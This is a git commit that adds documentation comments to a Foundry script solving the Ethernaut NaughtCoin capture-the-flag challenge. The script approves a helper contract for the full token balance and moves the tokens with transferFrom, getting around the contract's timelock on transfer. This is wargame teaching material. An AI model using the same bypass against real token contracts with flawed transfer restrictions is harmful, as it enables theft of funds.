e3df8c49f00cd740ea4936f370395f8fa8698c63
Alexander Gadzhalov <alexander.gadzhalov@limechain.tech>
2024-11-07 20:31:32 +0200

    docs(NaughtCoin): style guide and comments

--- script/NaughtCoin.s.sol
+++ script/NaughtCoin.s.sol
@@ -13,21 +13,34 @@ contract Receiver {
     }
 }
 
+/// @author agadzhalov
+/// @title Solution to NaughtCoin Ethernaut challenge
+/// @notice Solution: 
+///         By ERC20 standard, the owner of the tokens can approve as many tokens as they hold to another account.
+///         When the other account has approval, it can spend tokens on behalf of the owner.
 contract NaughtCoinScript is Script {
 
     NaughtCoin public coin = NaughtCoin(0xe29B1342f9e85FE0372eF25bE76d942e33B6c0D5);
-    /**
-     * Solution: By ERC20 standard the owner of the tokens can approve as many as he has to another account.
-     * When the other account has an approvement he can spend it on behalf of the owner.
-     */
+    
     function run() public {
         vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
+        
+        // Retrieve the token balance of the specified wallet
         uint256 tokenAmount = coin.balanceOf(vm.envAddress("WALLLET_ADDRESS"));
         console.log("1. Initial balance", tokenAmount);
+        
+        // Deploy the Receiver contract
         Receiver receiver = new Receiver();
+        
+        // Approve the Receiver contract to transfer the tokens
         coin.approve(address(receiver), tokenAmount);
+        
+        // Execute token transfer from the specified wallet to the Receiver contract
         receiver.transferTokens(vm.envAddress("WALLLET_ADDRESS"), tokenAmount);
+        
+        // Log the final token balance after the transfer
         console.log("2. Balance after", coin.balanceOf(vm.envAddress("WALLLET_ADDRESS")));
+        
         vm.stopBroadcast();
 
     }
